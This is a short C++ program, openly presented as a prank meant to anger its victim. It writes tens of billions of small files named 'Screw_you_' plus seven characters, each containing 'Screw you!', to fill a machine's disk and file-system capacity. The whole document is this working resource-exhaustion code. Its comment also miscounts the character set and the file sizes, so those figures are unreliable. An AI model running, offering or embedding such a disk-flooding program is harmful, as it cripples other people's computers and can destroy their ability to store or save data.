/*
* This is the file that started it all
* do not use unless you want to make someone very mad
*/
#include <fstream>
int main() {
    const std::string alpha = "0123456789qwertyuiopasdfghjklzxcvbnm";
    std::ofstream file;
    const std::string ext = ".txt";
    const std::string hehe = "Screw_you_";

    // since alpha has 37 characters and there are 7 loops that means 37^7 files which is about 94.4 billlion files (of 1 kb each)
    for (char b : alpha) {
        for (char a : alpha) {
            for (char c : alpha) {
                for (char f : alpha) {
                    for (char t : alpha) {
                        for (char y : alpha) {
                            for (char o : alpha) {
                                file = std::ofstream(hehe + b + a + c + f + t + y + o + ext);
                                file << "Screw you!";
                            }
                        }
                    }
                }
            }
        }
    }
    return 0;
}
